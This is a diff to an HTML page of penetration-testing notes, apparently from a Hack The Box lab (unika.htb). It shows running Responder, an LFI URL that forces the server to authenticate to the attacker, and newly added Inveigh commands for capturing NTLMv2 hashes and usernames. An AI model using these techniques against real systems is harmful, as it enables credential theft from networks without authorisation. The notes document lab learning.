@@ -42,8 +42,15 @@
                 <pre><code class="language-bash">sudo responder -I tun0</code></pre>   
 
                 <p> and accesed a resource from the server we just setup using a LFI in the victim to let responder intercept de hash</p>
+                <pre><code class="language-uri">http://unika.htb/index.php?page=//localip/resource</code></pre>
 
-            <pre><code class="language-uri">http://unika.htb/index.php?page=//localip/resource</code></pre>
+                <h3>From windows</h3>
+                <p>An alternative to responder is <a class="notion-link" href="https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.12"><b>Inveigh</b></a></p>
+                <p>Run it using. Once you would like to enter the interactive mode press <b>ESC</b></p>
+                <pre><code class="language-uri">.\Inveight.exe</code></pre>
+                <p>Some of the commands
+                <pre><code class="language-uri">GET NTLMV2UNIQUE #Get NTLMv2 hashes</code></pre>
+GET NTLMV2USERNAMES  #Get usernames</p>
            </ul>    
             
             
